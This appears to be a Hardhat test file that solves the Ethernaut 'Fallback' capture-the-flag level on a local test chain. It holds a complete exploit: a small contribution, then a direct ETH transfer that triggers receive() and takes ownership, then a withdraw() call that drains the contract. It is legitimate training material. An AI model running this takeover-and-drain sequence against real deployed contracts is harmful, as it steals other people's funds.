import { expect } from "chai";
import { ethers } from "hardhat";
import { parseEther } from "ethers";

describe("Ethernaut Level 1 - Fallback", function () {
  it("should take ownership and withdraw all funds", async () => {
    const [deployer, attacker] = await ethers.getSigners();

    const FallbackFactory = await ethers.getContractFactory("Fallback");
    const fallback = await FallbackFactory.deploy();
    await fallback.waitForDeployment();

    const fallbackAddress = await fallback.getAddress();

    // Fund the contract with 1 ETH
    await deployer.sendTransaction({
      to: fallbackAddress,
      value: parseEther("1"),
    });

    // Step 1: contribute() with < 0.001 ETH
    const contributeData = fallback.interface.encodeFunctionData("contribute");
    await attacker.sendTransaction({
      to: fallbackAddress,
      data: contributeData,
      value: parseEther("0.0005"),
    });

    // Step 2: send ETH directly to trigger receive()
    await attacker.sendTransaction({
      to: fallbackAddress,
      value: parseEther("0.0001"),
    });

    // Step 3: confirm attacker is now the owner
    const owner: string = await fallback.getFunction("owner").staticCall();
    expect(owner).to.equal(attacker.address);

    // Step 4: call withdraw() using encoded data
    const withdrawData = fallback.interface.encodeFunctionData("withdraw");
    const before: bigint = await ethers.provider.getBalance(attacker.address);

    const tx = await attacker.sendTransaction({
      to: fallbackAddress,
      data: withdrawData,
    });
    const receipt = await tx.wait();

    if (!receipt) throw new Error("Transaction receipt is null");

    const gasUsed: bigint = receipt.gasUsed;
    const gasPrice: bigint = receipt.gasPrice ?? 0n;
    const gasCost = gasUsed * gasPrice;

    const after: bigint = await ethers.provider.getBalance(attacker.address);

    // Check that attacker balance increased (net of gas cost)
    expect(after + gasCost).to.be.greaterThan(before);

    // Step 5: check contract is drained
    const finalBalance: bigint = await ethers.provider.getBalance(fallbackAddress);
    expect(finalBalance).to.equal(0n);
  });
});
